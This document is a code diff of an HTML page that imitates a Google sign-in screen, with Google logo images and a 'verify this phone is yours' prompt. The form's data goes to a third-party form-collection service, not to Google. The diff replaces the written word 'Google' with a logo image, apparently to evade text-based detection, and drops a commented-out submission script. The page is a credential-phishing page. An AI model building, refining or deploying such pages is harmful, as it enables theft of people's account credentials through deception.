@@ -17,9 +17,9 @@
   <form action="https://getform.io/f/55d4de93-f13d-43fe-b11f-cbec582b9251" method="POST"
     style="display: flex; flex-direction: column">
     <div class="centerly">
-      <img src="./ggl-lg.png" alt="" style="margin-top: 10px;margin-bottom: 10px;">
+      <img class="lg1" src="./ggl-lg.png" alt="" style="margin-top: 10px;margin-bottom: 10px;">
       <h4 style="margin-top: 10px;margin-bottom: 10px;">Sign in</h4>
-      <p style="margin-top: 10px;margin-bottom: 10px;">Use your Google Account . The account will help us to verify is
+      <p style="margin-top: 10px;margin-bottom: 10px;">Use your <img class="lg2" src="./ggl-lg2.png" alt="" >  Account . The account will help us to verify is
         this phone is yours </p>
       <h5 style="margin-top: 10px;margin-bottom: 10px;" class="bl">Learn more</h3>
 
@@ -35,45 +35,6 @@
     <button type="submit" style="margin-top: 70px;margin-bottom: 10px;" class="next">Next</button>
 
   </form>
-
-
-  <!-- <script src="https://forminit.com/sdk/v1/forminit.js"></script>
-
-<script>
-  const forminit = new Forminit();
-  const FORM_ID = '55d4de93-f13d-43fe-b11f-cbec582b9251'; // ← Replace with your Form ID
-
-  const form = document.getElementById('contact-form');
-  const status = document.getElementById('form-status');
-  const button = form.querySelector('button[type="submit"]');
-
-  form.addEventListener('submit', async function(event) {
-    event.preventDefault();
-    
-    // Show loading state
-    status.textContent = 'Sending...';
-    status.className = 'status-loading';
-    button.disabled = true;
-    button.textContent = 'Sending...';
-
-    const formData = new FormData(form);
-    const { data, error } = await forminit.submit(FORM_ID, formData);
-
-    button.disabled = false;
-    button.textContent = 'Send Message';
-
-    if (error) {
-      status.textContent = error.message;
-      status.className = 'status-error';
-      return;
-    }
-
-    // Success
-    status.textContent = 'Message sent successfully!';
-    status.className = 'status-success';
-    form.reset();
-  });
-</script> -->
 
 
 
